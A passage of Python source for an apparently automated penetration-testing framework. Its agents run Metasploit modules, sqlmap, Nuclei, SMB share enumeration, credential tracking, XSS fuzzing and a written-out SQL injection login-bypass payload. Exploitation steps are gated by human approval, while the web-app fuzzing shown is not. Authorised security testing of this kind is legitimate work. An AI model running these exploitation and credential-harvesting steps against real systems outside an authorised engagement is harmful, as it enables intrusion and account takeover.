                strategy_desc = "Nuclei template re-validation"

            await ex.think(
                thought=f"Preparing exploitation for: {vuln_name} [{strategy}]",
                reasoning=f"Target: {target}. Strategy: {strategy_desc}. "
                          f"{'Enrichment: ' + enrichment_desc + '. ' if enrichment_desc else ''}"
                          f"Need HITL approval before execution.",
                action="request_approval",
            )

            # HITL gate with enrichment context
            hitl_desc = (
                f"Validate {vuln_name} on {target}. "
                f"Severity: {vuln.get('severity', 'HIGH')}. "
                f"Strategy: {strategy_desc}."
            )
            if enrichment_desc:
                hitl_desc += f"\nEnrichment: {enrichment_desc}"

            approved = await ex.request_approval(
                action=f"Exploit validation: {vuln_name}",
                description=hitl_desc,
                risk_level="high",
                target=target,
            )

            if not approved:
                await ex.think(
                    thought=f"HITL rejected exploitation of {vuln_name}. Skipping.",
                    reasoning="Operator decision respected. Moving to next vulnerability.",
                )
                continue

            # Execute exploitation based on strategy
            if strategy == "metasploit":
                await self._exploit_with_metasploit(ex, vuln, target, best_module, ctx)
            elif strategy == "sqlmap":
                await self._exploit_with_sqlmap(ex, vuln, target, ctx)
            else:
                await self._exploit_with_nuclei(ex, vuln, target, ctx)

        await ex.complete(
            f"Exploitation validation complete: {ctx.finding_count} findings confirmed."
        )

    async def _exploit_with_metasploit(
        self, ex: AgentRunner, vuln: dict, target: str,
        module: dict, ctx: EngagementContext,
    ):
        """Priority 1: Run a Metasploit module against the target."""
        import re as _re

        # Extract host and port from target URL or host:port
        rhost = target
        rport = ""
        url_match = _re.search(r'://([^:/]+)(?::(\d+))?', target)
        if url_match:
            rhost = url_match.group(1)
            rport = url_match.group(2) or ""
        elif ':' in target:
            parts = target.rsplit(':', 1)
            if parts[1].isdigit():
                rhost = parts[0]
                rport = parts[1]

        options = {"RHOSTS": rhost}
        if rport:
            options["RPORT"] = rport

        # Extract URI path for web exploits
        if "://" in target:
            path_match = _re.search(r'://[^/]+(/.*)$', target)
            if path_match:
                options["TARGETURI"] = path_match.group(1)

        result = await ex.run_tool(
            "metasploit_run",
            {"module": module["module_path"], "options": options},
            display=f"Metasploit: {module['module_path']} → {rhost}...",
        )

        if result.success:
            # Check for session opened or exploit success indicators
            output = result.stdout or ""
            session_opened = "session" in output.lower() and "opened" in output.lower()
            exploit_completed = "exploit completed" in output.lower()

            if session_opened or exploit_completed:
                await ex.report_finding(
                    title=f"Confirmed: {vuln.get('name', 'Unknown')} (Metasploit)",
                    severity=vuln.get("severity", "HIGH").lower(),
                    category="Validated Exploit",
                    target=target,
                    description=f"Exploited via Metasploit module {module['module_path']} "
                                f"(rank: {module['rank']}). "
                                f"{vuln.get('name', '')}",
                    cvss=vuln.get("cvss_score", 0),
                    cve=vuln.get("cve_id", ""),
                    evidence=output[:2000],
                )
                # Track credential / access from session — only if a REAL username was found
                if session_opened:
                    # Parse session details from Metasploit output
                    # Typical: "Meterpreter session 1 opened (10.0.0.1:4444 -> 10.1.1.25:52432)"
                    # or "Command shell session 1 opened ..."
                    sess_type = "meterpreter" if "meterpreter" in output.lower() else "shell"
                    # Extract UID if present (e.g., "Server username: www-data")
                    uid_match = _re.search(
                        r'(?:uid=\d+\((\w+)\)|Server username:\s*(\S+)|'
                        r'running as[:\s]+(\S+)|current user[:\s]+(\S+))',
                        output, _re.IGNORECASE,
                    )
                    username = None
                    if uid_match:
                        username = next((g for g in uid_match.groups() if g), None)
                    # Only record credential if we got a real username
                    if username:
                        # Determine access level from output
                        access_level = "user"
                        if any(w in output.lower() for w in ("uid=0", "root", "nt authority\\system", "admin")):
                            access_level = "root"
                        # Determine port/service from module path
                        mod_path = module["module_path"]
                        service = "unknown"
                        for svc_hint, svc_name in [
                            ("http", "HTTP"), ("apache", "HTTP"), ("tomcat", "HTTP/Tomcat"),
                            ("smb", "SMB"), ("ssh", "SSH"), ("ftp", "FTP"), ("mysql", "MySQL"),
                            ("postgres", "PostgreSQL"), ("php", "PHP/CGI"), ("java", "Java"),
                            ("distcc", "distccd"), ("samba", "Samba"), ("vnc", "VNC"),
                        ]:
                            if svc_hint in mod_path.lower():
                                service = svc_name
                                break
                        await self.state.add_credential(
                            ctx.engagement_id,
                            {
                                "username": username,
                                "access_level": access_level,
                                "session_type": sess_type,
                                "service": service,
                                "port": rport or "—",
                                "source": f"Metasploit ({mod_path})",
                                "host": rhost,
                                "type": "exploited",
                                "finding_id": ctx.findings[-1]["id"] if ctx.findings else "",
                                "vuln_name": vuln.get("name", ""),
                                "cve": vuln.get("cve_id", ""),
                            },
                        )
            else:
                # Module ran but no session — still report as validated attempt
                await ex.think(
                    thought=f"Metasploit module completed but no session opened for {vuln.get('name', '')}.",
                    reasoning="Module may require specific payload/target configuration. "
                              "Falling back to Nuclei re-validation.",
                )
                # Fall through to Nuclei as backup
                await self._exploit_with_nuclei(ex, vuln, target, ctx)

    async def _exploit_with_sqlmap(
        self, ex: AgentRunner, vuln: dict, target: str, ctx: EngagementContext,
    ):
        """Priority 2: SQLMap injection validation."""
        result = await ex.run_tool(
            "sqlmap_scan",
            {"url": target, "additional_args": "--technique=B --risk=1 --level=1"},
            display=f"SQLMap validation on {target}...",
        )
        if result.success:
            parsed = parse_sqlmap_output(result.stdout)
            if parsed["injectable"]:
                await ex.report_finding(
                    title=f"Confirmed SQL Injection — {parsed['parameter']}",
                    severity="critical",
                    category="Injection",
                    target=target,
                    description=parsed["details"],
                    cvss=9.8,
                    cve=vuln.get("cve_id", ""),
                    evidence=result.stdout[:2000],
                )

    async def _exploit_with_nuclei(
        self, ex: AgentRunner, vuln: dict, target: str, ctx: EngagementContext,
    ):
        """Priority 3: Nuclei template re-validation fallback."""
        result = await ex.run_tool(
            "nuclei_scan",
            {"targets": [target],
             "additional_args": f"-id {vuln.get('template_id', '')}"},
            display=f"Re-validating {vuln.get('name', 'Unknown')} on {target}...",
        )
        if result.success:
            re_vulns = parse_nuclei_results(result.stdout, ctx.engagement_id)
            if re_vulns:
                v = re_vulns[0]
                await ex.report_finding(
                    title=f"Confirmed: {vuln.get('name', 'Unknown')}",
                    severity=vuln.get("severity", "HIGH").lower(),
                    category="Validated Exploit",
                    target=target,
                    description=f"Re-validated via Nuclei template "
                                f"{v.get('template_id', '')}. "
                                f"{v.get('description', vuln.get('name', ''))}",
                    cvss=vuln.get("cvss_score", 0),
                    cve=vuln.get("cve_id", ""),
                    evidence=result.stdout[:2000],
                )

        # VF: Independent verification
        vf = self._runner("VF", ctx)
        await vf.think(
            thought="Independently re-verifying exploitation findings.",
            reasoning="The finder is not the verifier. Re-running with fresh parameters "
                      "to confirm findings match. Evidence hash comparison.",
        )
        # VF re-runs a subset of validated exploits for confirmation
        await vf.complete(
            f"Verification complete: {ctx.finding_count} findings confirmed."
        )

    # ── Phase 6: Post-Exploitation ──

    async def _phase_post_exploitation(self, ctx: EngagementContext):
        """PE: Post-exploitation (HITL gated) + DV: Detection validation."""
        await self._emit_phase("POST-EXPLOITATION")

        pe = self._runner("PE", ctx)

        # Only run post-exploitation if there are confirmed exploits
        if not ctx.findings:
            await pe.complete("No confirmed exploits — skipping post-exploitation.")
            # Still run detection validator
            await self._detection_validation(ctx)
            return

        await pe.think(
            thought="Mapping potential lateral movement and impact from confirmed exploits.",
            reasoning="Post-exploitation maps the blast radius — what an attacker could access "
                      "from each compromised position. HITL approval required.",
            action="request_approval",
        )

        approved = await pe.request_approval(
            action="Post-exploitation simulation",
            description="Map lateral movement paths and credential harvesting opportunities "
                        "from confirmed exploitation positions. Network enumeration only — "
                        "no destructive actions.",
            risk_level="high",
            target=ctx.engagement_id,
        )

        if approved:
            # NetExec for network enumeration (internal targets)
            if ctx.target_type == "internal":
                targets = list(set(r["ip"] for r in ctx.discovered_hosts))[:10]
                for target_ip in targets:
                    result = await pe.run_tool(
                        "crackmapexec_scan",
                        {"target": target_ip, "protocol": "smb",
                         "additional_args": "--shares"},
                        display=f"NetExec SMB enum on {target_ip}...",
                        backend="internal",
                    )
                    if result.success:
                        nxc_results = parse_netexec_output(result.stdout)
                        for r in nxc_results:
                            if r["status"] == "pwned":
                                await pe.report_finding(
                                    title=f"SMB Access — {r['hostname']}",
                                    severity="high",
                                    category="Lateral Movement",
                                    target=r["host"],
                                    description=r["info"],
                                )
                                # Track credential harvest — only if real username found
                                nxc_user = r.get("username", "")
                                if nxc_user and nxc_user.lower() != "unknown":
                                    info_lower = r.get("info", "").lower()
                                    cred_type = "default" if "default" in info_lower else (
                                        "weak" if any(w in info_lower for w in ("weak", "password1", "123")) else "harvested"
                                    )
                                    await self.state.add_credential(
                                        ctx.engagement_id,
                                        {
                                            "username": nxc_user,
                                            "access_level": "admin" if "admin" in info_lower else "user",
                                            "service": f"SMB ({r.get('protocol', 'smb').upper()})",
                                            "port": str(r.get("port", 445)),
                                            "source": "NetExec",
                                            "host": r["host"],
                                            "hostname": r.get("hostname", ""),
                                            "type": cred_type,
                                            "finding_id": ctx.findings[-1]["id"] if ctx.findings else "",
                                        },
                                    )

        await pe.complete("Post-exploitation analysis complete.")

        # AA: API Attacker (uses auth context from AT + endpoints from JS)
        await self._webapp_api_attack(ctx)

        # DV: Detection Validator
        await self._detection_validation(ctx)

    async def _detection_validation(self, ctx: EngagementContext):
        """DV: Check detection coverage for exploitation activities."""
        dv = self._runner("DV", ctx)
        await dv.think(
            thought="Analyzing detection coverage for all exploitation activities.",
            reasoning="Undetected exploitation is often the most critical finding for the client. "
                      "Need to determine if SIEM/EDR/WAF caught the attacks.",
        )
        # DV is currently analysis-only — in Phase D/E it queries SIEM APIs
        await dv.complete(
            "Detection analysis complete. Manual SIEM review recommended for full coverage assessment."
        )

    # ── Phase 7: Reporting ──

    async def _phase_reporting(self, ctx: EngagementContext):
        """RP: Aggregate findings from Neo4j and prepare report data."""
        await self._emit_phase("REPORTING")

        rp = self._runner("RP", ctx)
        await rp.think(
            thought="Compiling engagement results for report generation.",
            reasoning="Aggregating all findings, evidence, and statistics from Neo4j "
                      "for executive summary, technical report, and remediation roadmap.",
        )

        # Query Neo4j for final stats
        from server import neo4j_available, neo4j_driver
        report_data = {
            "engagement_id": ctx.engagement_id,
            "hosts": ctx.host_count,
            "services": ctx.service_count,
            "vulnerabilities": ctx.vuln_count,
            "findings": ctx.finding_count,
            "severity_breakdown": {},
        }

        if neo4j_available and neo4j_driver:
            try:
                with neo4j_driver.session() as session:
                    result = session.run("""
                        MATCH (f:Finding {engagement_id: $eid})
                        RETURN f.severity AS severity, count(f) AS count
                    """, eid=ctx.engagement_id)
                    for record in result:
                        report_data["severity_breakdown"][record["severity"]] = record["count"]
            except Exception as e:
                logger.warning("Neo4j report query error: %s", e)

        await rp.complete(
            f"Report data compiled: {ctx.finding_count} findings "
            f"({report_data.get('severity_breakdown', {})}). "
            f"PDF generation deferred to Phase D."
        )

    # ── Phase E: Web App Testing ──

    async def _recon_js_analysis(self, ctx: EngagementContext):
        """JS: Analyze JavaScript bundles for API endpoints and secrets."""
        js = self._runner("JS", ctx)

        # Wait briefly for AR to discover URLs first (JS needs web targets)
        await asyncio.sleep(5)

        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
        # Also try building URLs from discovered hosts with web ports
        web_ports = {80, 443, 8080, 8443, 8000, 8180, 8888, 3000, 3030, 5000, 9090}
        https_ports = {443, 8443}
        for r in ctx.discovered_hosts:
            if r.get("port") in web_ports:
                proto = "https" if r["port"] in https_ports else "http"
                url = f"{proto}://{r['ip']}:{r['port']}"
                if url not in web_targets:
                    web_targets.append(url)

        # Fallback: use scope URLs only if their port is confirmed open
        if not web_targets:
            open_ports_set = {(r["ip"], r.get("port", 0)) for r in ctx.discovered_hosts}
            for t in ctx.scope.get("targets", []):
                if t.startswith("http://") or t.startswith("https://"):
                    try:
                        _p = urlparse(t)
                        _host = _p.hostname or ""
                        _port = _p.port or (443 if _p.scheme == "https" else 80)
                        if (_host, _port) in open_ports_set:
                            if t not in web_targets:
                                web_targets.append(t)
                    except Exception:
                        pass

        if not web_targets:
            await js.complete("No web targets for JavaScript analysis.")
            return

        await js.think(
            thought="Fetching and analyzing JavaScript bundles for API endpoints.",
            reasoning="Modern SPAs embed API routes, admin paths, and sometimes secrets "
                      "in JavaScript bundles. Static analysis reveals hidden attack surface.",
        )

        import re as _re
        discovered = []

        for target_url in web_targets[:5]:
            # Fetch the main page to find JS bundle URLs
            result = await js.run_tool(
                "curl_raw",
                {"url": target_url, "options": "-L"},
                display=f"Fetching {target_url} for JS analysis...",
            )
            if not result.success:
                continue

            html = result.stdout or ""
            script_urls = _re.findall(
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html,
            )

            # Skip known vendor/library bundles that are huge and contain no app code
            _vendor_skip = {'vendor.js', 'polyfills.js', 'chunk-vendors.js',
                            'vendors~main.js', 'vendor.bundle.js'}

            for script_src in script_urls[:10]:
                # Skip vendor bundles — they're library code, not app code
                basename = script_src.split('/')[-1].split('?')[0]
                if basename in _vendor_skip:
                    continue

                # Resolve relative URLs
                if script_src.startswith("//"):
                    script_src = "https:" + script_src
                elif script_src.startswith("/"):
                    base_match = _re.match(r'(https?://[^/]+)', target_url)
                    if base_match:
                        script_src = base_match.group(1) + script_src
                elif not script_src.startswith("http"):
                    script_src = target_url.rstrip("/") + "/" + script_src

                # Skip external CDN/third-party scripts — only fetch in-scope hosts
                scope_hosts = set(extract_hosts(ctx.scope.get("targets", [])))
                script_host = urlparse(script_src).hostname or ""
                if script_host and script_host not in scope_hosts:
                    continue

                js_result = await js.run_tool(
                    "curl_raw",
                    {"url": script_src, "options": "-L --max-filesize 1048576"},
                    display=f"Fetching JS: {script_src}...",
                )
                if not js_result.success or not js_result.stdout:
                    continue

                analysis = parse_js_analysis(js_result.stdout)

                for endpoint in analysis.get("endpoints", []):
                    ep = {
                        "url": endpoint,
                        "method": "GET",
                        "source_agent": "JS",
                        "params": [],
                        "base_url": target_url,
                    }
                    ctx.discovered_endpoints.append(ep)
                    discovered.append(endpoint)

                for secret in analysis.get("secrets", []):
                    await js.report_finding(
                        title=f"Secret in JS bundle: {secret[:50]}",
                        severity="high",
                        category="Information Disclosure",
                        target=script_src,
                        description=f"Hardcoded secret found in JavaScript source: {secret[:200]}",
                        evidence=secret[:500],
                    )

                for route in analysis.get("admin_routes", []):
                    ep = {
                        "url": route,
                        "method": "GET",
                        "source_agent": "JS",
                        "params": [],
                        "base_url": target_url,
                        "admin": True,
                    }
                    ctx.discovered_endpoints.append(ep)
                    discovered.append(route)

        await js.complete(
            f"JS analysis complete: {len(discovered)} endpoints, "
            f"{len(ctx.discovered_endpoints)} total endpoints discovered."
        )

    async def _phase_webapp_testing(self, ctx: EngagementContext):
        """Phase E web app testing: PD → WA → AT (sequential — each depends on prior)."""
        # Only run if we have web targets or discovered endpoints
        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
        if not web_targets and not ctx.discovered_endpoints:
            return

        await self._emit_phase("WEB APP TESTING")

        or_runner = self._runner("OR", ctx)
        await or_runner.think(
            thought="Dispatching web application testing agents.",
            reasoning="Parameter discovery feeds into web fuzzing, which feeds into auth testing. "
                      "Sequential pipeline: PD → WA → AT.",
            action="dispatch_webapp_agents",
        )

        await self._webapp_param_discovery(ctx)
        await self._webapp_fuzzing(ctx)
        await self._webapp_auth_testing(ctx)

    async def _webapp_param_discovery(self, ctx: EngagementContext):
        """PD: Discover hidden parameters on discovered endpoints."""
        pd = self._runner("PD", ctx)

        # Build target list from discovered API endpoints (from JS analysis)
        # Arjun needs specific API paths, NOT root URLs like http://host:port/
        targets = []
        for ep in ctx.discovered_endpoints:
            base = ep.get("base_url", "")
            url = ep.get("url", "")
            if url.startswith("http"):
                targets.append(url)
            elif base and url.startswith("/"):
                full = base.rstrip("/") + url
                if full not in targets:
                    targets.append(full)
        # Add discovered web URLs that have a meaningful path (not just root)
        # Root URLs (/, /gym/, etc.) cause Arjun to timeout or error
        from urllib.parse import urlparse as _urlparse
        for url in ctx.discovered_urls:
            if url.startswith("http") and url not in targets:
                path = _urlparse(url).path.rstrip("/")
                # Only add URLs with a path depth > 1 segment (e.g. /api/Users, not just /)
                if path and path.count("/") >= 2:
                    targets.append(url)

        if not targets:
            await pd.complete("No endpoints for parameter discovery.")
            return

        await pd.think(
            thought=f"Discovering hidden parameters on {len(targets)} endpoints.",
            reasoning="Arjun brute-forces parameter names with smart heuristics "
                      "to find hidden GET/POST parameters that expand the attack surface.",
        )

        total_params = 0
        for target_url in targets[:10]:
            result = await pd.run_tool(
                "arjun_params",
                {"url": target_url},
                display=f"Arjun parameter discovery on {target_url}...",
            )
            if result.success:
                parsed = parse_arjun(result.stdout)
                if parsed.get("params"):
                    ctx.discovered_params[target_url] = parsed["params"]
                    total_params += len(parsed["params"])
                    # Also update matching endpoint entries
                    for ep in ctx.discovered_endpoints:
                        ep_url = ep.get("url", "")
                        if not ep_url.startswith("http"):
                            ep_url = ep.get("base_url", "").rstrip("/") + ep_url
                        if ep_url == target_url:
                            ep["params"] = parsed["params"]

        await pd.complete(
            f"Parameter discovery complete: {total_params} hidden parameters "
            f"on {len(ctx.discovered_params)} endpoints."
        )

    async def _webapp_fuzzing(self, ctx: EngagementContext):
        """WA: Fuzz endpoints for XSS, injection, and IDOR."""
        wa = self._runner("WA", ctx)

        # Collect endpoints with parameters
        fuzz_targets = []
        for url, params in ctx.discovered_params.items():
            fuzz_targets.append({"url": url, "params": params})
        for ep in ctx.discovered_endpoints:
            if ep.get("params"):
                base = ep.get("base_url", "")
                url = ep.get("url", "")
                full_url = url if url.startswith("http") else base.rstrip("/") + url
                # Avoid duplicates
                if not any(ft["url"] == full_url for ft in fuzz_targets):
                    fuzz_targets.append({"url": full_url, "params": ep["params"]})

        if not fuzz_targets:
            # No parameterized endpoints from PD — run Feroxbuster + direct XSS probing
            web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
            if not web_targets:
                await wa.complete("No targets for web app fuzzing.")
                return

            await wa.think(
                thought="No parameterized endpoints — running content discovery + direct XSS probing.",
                reasoning="Feroxbuster discovers hidden paths. Dalfox can also scan URLs "
                          "directly for reflected XSS using its own parameter discovery.",
            )

            # Feroxbuster content discovery
            for target_url in web_targets[:3]:
                result = await wa.run_tool(
                    "feroxbuster_scan",
                    {"url": target_url},
                    display=f"Feroxbuster recursive scan on {target_url}...",
                )
                if result.success:
                    parsed = parse_feroxbuster(result.stdout)
                    _ferox_sensitive = {
                        "admin", "backup", "config", "include", ".git",
                        ".env", ".htaccess", "phpmyadmin", "phpinfo",
                        "upload", "cgi-bin", "server-status", "database",
                        "console", "debug", "test",
                    }
                    for entry in parsed:
                        if entry.get("status") in (200, 301, 302, 403):
                            ctx.discovered_urls.append(entry["url"])
                            # Report sensitive paths as findings
                            epath = entry.get("url", "").rstrip("/").split("/")[-1].lower()
                            if epath in _ferox_sensitive or any(
                                s in epath for s in (".git", ".env", "phpmyadmin", "phpinfo", "backup")
                            ):
                                await wa.report_finding(
                                    title=f"Sensitive path: {entry['url']}",
                                    severity="medium",
                                    category="Information Disclosure",
                                    target=entry["url"],
                                    description=(
                                        f"Content discovery found {entry['url']} "
                                        f"(HTTP {entry.get('status', '?')}). "
                                        f"May expose sensitive data or admin functionality."
                                    ),
                                )

            # Direct Dalfox XSS scan on web targets (dalfox has built-in param mining)
            xss_count = 0
            for target_url in web_targets[:3]:
                result = await wa.run_tool(
                    "dalfox_xss",
                    {"url": target_url},
                    display=f"Dalfox XSS scan: {target_url}...",
                )
                if result.success:
                    xss_findings = parse_dalfox(result.stdout)
                    for xss in xss_findings:
                        xss_count += 1
                        await wa.report_finding(
                            title=f"XSS: {xss.get('type', 'Reflected')} on {target_url}",
                            severity=xss.get("severity", "high").lower(),
                            category="Cross-Site Scripting",
                            target=target_url,
                            description=f"Payload: {xss.get('payload', 'N/A')}",
                            evidence=xss.get("poc", ""),
                        )

            # SQLMap on discovered endpoints that look injectable
            injectable_urls = [
                u for u in ctx.discovered_urls
                if "?" in u or any(
                    k in u.lower() for k in ("search", "query", "id=", "page=", "sort=")
                )
            ]
            for target_url in injectable_urls[:3]:
                result = await wa.run_tool(
                    "sqlmap_scan",
                    {"url": target_url, "options": "--batch --level=1 --risk=1 --random-agent"},
                    display=f"SQLMap scan: {target_url}...",
                )
                if result.success and result.stdout:
                    output = result.stdout.lower()
                    if "is vulnerable" in output or "injectable" in output:
                        await wa.report_finding(
                            title=f"SQL Injection: {target_url}",
                            severity="critical",
                            category="SQL Injection",
                            target=target_url,
                            description="SQLMap confirmed SQL injection vulnerability.",
                            cvss=9.8,
                            evidence=result.stdout[:2000],
                        )

            await wa.complete(
                f"Web app fuzzing complete: {xss_count} XSS, "
                f"{len(injectable_urls)} targets tested for SQLi."
            )
            return

        await wa.think(
            thought=f"Fuzzing {len(fuzz_targets)} endpoints for XSS and injection.",
            reasoning="Dalfox scans for XSS on parameterized endpoints. "
                      "ffuf tests IDOR patterns on ID-based endpoints.",
        )

        xss_count = 0
        for ft in fuzz_targets[:10]:
            url = ft["url"]
            params = ft.get("params", [])

            # XSS scanning with Dalfox on each parameter
            for param in params[:5]:
                test_url = (
                    f"{url}?{param}=FUZZ"
                    if "?" not in url
                    else f"{url}&{param}=FUZZ"
                )
                result = await wa.run_tool(
                    "dalfox_xss",
                    {"url": test_url},
                    display=f"Dalfox XSS: {url} ({param})...",
                )
                if result.success:
                    xss_findings = parse_dalfox(result.stdout)
                    for xss in xss_findings:
                        xss_count += 1
                        await wa.report_finding(
                            title=f"XSS: {xss.get('type', 'Reflected')} on {param}",
                            severity=xss.get("severity", "high").lower(),
                            category="Cross-Site Scripting",
                            target=url,
                            description=(
                                f"Parameter: {param}. "
                                f"Payload: {xss.get('payload', 'N/A')}"
                            ),
                            evidence=xss.get("poc", ""),
                        )
                        self._record_chain_step(
                            ctx, "WA",
                            f"XSS on {param} at {url}",
                            xss.get("severity", "high").lower(),
                        )

        await wa.complete(f"Web app fuzzing complete: {xss_count} XSS findings.")

    async def _webapp_auth_testing(self, ctx: EngagementContext):
        """AT: Test authentication bypasses, JWT manipulation, registration abuse."""
        at = self._runner("AT", ctx)

        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
        if not web_targets:
            await at.complete("No web targets for auth testing.")
            return

        base_url = web_targets[0].rstrip("/")

        await at.think(
            thought="Testing authentication mechanisms for bypasses and weaknesses.",
            reasoning="Modern web apps use JWT, session cookies, or API keys. "
                      "Testing for SQL injection in login, registration abuse, "
                      "and unauthenticated admin access.",
            action="test_auth",
        )

        # ── Build login/register/admin endpoint lists ──
        # Use discovered endpoints from JS analysis
        login_endpoints = [
            ep for ep in ctx.discovered_endpoints
            if any(
                k in ep.get("url", "").lower()
                for k in ("login", "auth", "signin", "session")
            )
        ]
        register_endpoints = [
            ep for ep in ctx.discovered_endpoints
            if any(
                k in ep.get("url", "").lower()
                for k in ("register", "signup", "users")
            )
        ]
        admin_eps = [
            ep for ep in ctx.discovered_endpoints
            if ep.get("admin") or "admin" in ep.get("url", "").lower()
        ]

        # ── HTML Form Discovery ──
        # A real pentester inspects the HTML for <form> tags to find actual
        # login/search/contact endpoints rather than guessing REST API paths.
        if not login_endpoints and not register_endpoints:
            await at.think(
                thought="Discovering HTML forms on web targets.",
                reasoning="PHP and traditional web apps expose login/search forms via "
                          "HTML <form> tags. Extracting action URLs reveals the real "
                          "endpoints to test, not just guessed REST API paths.",
            )
            import re as _re_at
            for target_url in web_targets[:3]:
                target_base = target_url.rstrip("/")
                # Fetch the page HTML
                html_result = await at.run_tool(
                    "curl_raw",
                    {"url": target_url, "options": "-s -L"},
                    display=f"Fetching HTML forms from {target_url}...",
                )
                if not html_result.success:
                    continue
                html_body = html_result.stdout or ""
                # Extract form actions and categorize
                forms = _re_at.findall(
                    r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                    html_body, _re_at.DOTALL | _re_at.IGNORECASE,
                )
                for action, form_body in forms:
                    if not action or action.startswith("javascript:") or action == "#":
                        continue
                    # Build full URL from relative action
                    if action.startswith("http"):
                        form_url = action
                    elif action.startswith("/"):
                        from urllib.parse import urlparse as _up
                        p = _up(target_base)
                        form_url = f"{p.scheme}://{p.netloc}{action}"
                    else:
                        form_url = target_base + "/" + action

                    # Extract input field names
                    inputs = _re_at.findall(
                        r'<input[^>]*name=["\']([^"\']+)["\']', form_body, _re_at.IGNORECASE,
                    )
                    form_lower = form_body.lower()
                    ep_entry = {
                        "url": form_url, "base_url": target_base,
                        "method": "POST", "source_agent": "AT",
                        "params": inputs, "form_discovered": True,
                    }
                    # Categorize by content
                    if any(k in form_lower for k in ("password", "passwd", "login", "signin")):
                        login_endpoints.append(ep_entry)
                        ctx.discovered_endpoints.append(ep_entry)
                    elif any(k in form_lower for k in ("register", "signup", "create")):
                        register_endpoints.append(ep_entry)
                        ctx.discovered_endpoints.append(ep_entry)
                    elif any(k in form_lower for k in ("search", "query", "q=")):
                        # Search forms — good XSS/injection targets
                        ctx.discovered_endpoints.append(ep_entry)

                # Also check common PHP-specific paths
                for php_path in ["/login.php", "/admin/login.php", "/register.php",
                                 "/index.php?page=login", "/user/login.php"]:
                    php_url = target_base + php_path
                    php_probe = await at.run_tool(
                        "curl_raw",
                        {"url": php_url, "options": "-s -o /dev/null -w '%{http_code}:%{size_download}'"},
                        display=f"Probing PHP path {php_url}...",
                    )
                    if php_probe.success and php_probe.stdout:
                        parts = php_probe.stdout.strip().strip("'").split(":")
                        code = parts[0] if parts else ""
                        size = parts[1] if len(parts) > 1 else "0"
                        if code in ("200", "302") and size != "0":
                            login_endpoints.append({
                                "url": php_url, "base_url": target_base,
                                "method": "POST", "source_agent": "AT",
                                "params": [], "form_discovered": False,
                            })

        # ── Fallback: probe common REST endpoints with soft-404 detection ──
        if not login_endpoints and not register_endpoints:
            await at.think(
                thought="No forms found — probing common REST auth paths with soft-404 detection.",
                reasoning="Web servers often return 200 for all paths (catch-all/SPA). "
                          "Comparing response size against a known-bad path filters false positives.",
            )
            common_auth_paths = [
                "/rest/user/login", "/api/login", "/login", "/api/auth/login",
                "/api/Users/login", "/signin", "/api/signin",
            ]
            common_register_paths = [
                "/api/Users", "/rest/user/register", "/api/register",
                "/register", "/signup", "/api/signup",
            ]
            common_admin_paths = [
                "/admin", "/api/admin", "/administration", "/#/administration",
                "/dashboard", "/api/SecurityQuestions", "/api/Challenges",
            ]

            for target_url in web_targets[:3]:
                target_base = target_url.rstrip("/")

                # Get baseline response size for a known-bad URL (soft-404 detection)
                baseline = await at.run_tool(
                    "curl_raw",
                    {"url": target_base + "/athena-nonexistent-path-xyzzy",
                     "options": "-s -o /dev/null -w '%{http_code}:%{size_download}'"},
                    display=f"Getting baseline response for soft-404 detection...",
                )
                baseline_size = "0"
                if baseline.success and baseline.stdout:
                    parts = baseline.stdout.strip().strip("'").split(":")
                    baseline_size = parts[1] if len(parts) > 1 else "0"

                def _is_real_endpoint(probe_stdout: str) -> bool:
                    """Check if probe response is a real endpoint (not soft-404)."""
                    if not probe_stdout:
                        return False
                    parts = probe_stdout.strip().strip("'").split(":")
                    code = parts[0] if parts else ""
                    size = parts[1] if len(parts) > 1 else "0"
                    if code in ("404", "000", ""):
                        return False
                    # If same size as baseline, it's a soft-404
                    if size == baseline_size and baseline_size != "0":
                        return False
                    return True

                # Probe login paths
                for path in common_auth_paths:
                    probe_url = target_base + path
                    probe = await at.run_tool(
                        "curl_raw",
                        {"url": probe_url, "options": "-s -o /dev/null -w '%{http_code}:%{size_download}'"},
                        display=f"Probing {probe_url}...",
                    )
                    if probe.success and _is_real_endpoint(probe.stdout):
                        login_endpoints.append({
                            "url": path, "base_url": target_base,
                            "method": "POST", "source_agent": "AT", "params": [],
                        })
                        ctx.discovered_endpoints.append(login_endpoints[-1])

                # Probe register paths
                for path in common_register_paths:
                    probe_url = target_base + path
                    probe = await at.run_tool(
                        "curl_raw",
                        {"url": probe_url, "options": "-s -o /dev/null -w '%{http_code}:%{size_download}'"},
                        display=f"Probing {probe_url}...",
                    )
                    if probe.success and _is_real_endpoint(probe.stdout):
                        register_endpoints.append({
                            "url": path, "base_url": target_base,
                            "method": "POST", "source_agent": "AT", "params": [],
                        })
                        ctx.discovered_endpoints.append(register_endpoints[-1])

                # Probe admin paths
                for path in common_admin_paths:
                    probe_url = target_base + path
                    probe = await at.run_tool(
                        "curl_raw",
                        {"url": probe_url, "options": "-s -o /dev/null -w '%{http_code}:%{size_download}'"},
                        display=f"Probing {probe_url}...",
                    )
                    if probe.success and _is_real_endpoint(probe.stdout):
                        admin_eps.append({
                            "url": path, "base_url": target_base,
                            "source_agent": "AT", "params": [], "admin": True,
                        })
                        ctx.discovered_endpoints.append(admin_eps[-1])

        # ── Test 1: SQL injection in login endpoints ──
        for ep in login_endpoints[:5]:
            url = ep.get("url", "")
            if not url.startswith("http"):
                url = (ep.get("base_url", "") or base_url).rstrip("/") + url

            # JSON body SQLi (for REST API apps like Juice Shop)
            result = await at.run_tool(
                "curl_raw",
                {
                    "url": url,
                    "options": (
                        "-X POST -H 'Content-Type: application/json' "
                        "-d '{\"email\":\"\\' OR 1=1--\",\"password\":\"test\"}'"
                    ),
                },
                display=f"Testing SQLi on login: {url}...",
            )
            if result.success:
                parsed = parse_curl(result.stdout)
                if parsed.get("status_code") == 200 and parsed.get("body_json"):
                    body = parsed["body_json"]
                    if body.get("authentication") or body.get("token") or body.get("access_token"):
                        await at.report_finding(
                            title="SQL Injection Authentication Bypass",
                            severity="critical",
                            category="Authentication",
                            target=url,
                            description=(
                                "Login endpoint accepts SQL injection in credentials, "
                                "allowing authentication bypass."
                            ),
                            cvss=9.8,
                            evidence=result.stdout[:2000],
                        )
                        self._record_chain_step(
                            ctx, "AT", "SQLi auth bypass", "critical",
                        )
                        token = body.get("token") or body.get("access_token", "")
                        if token:
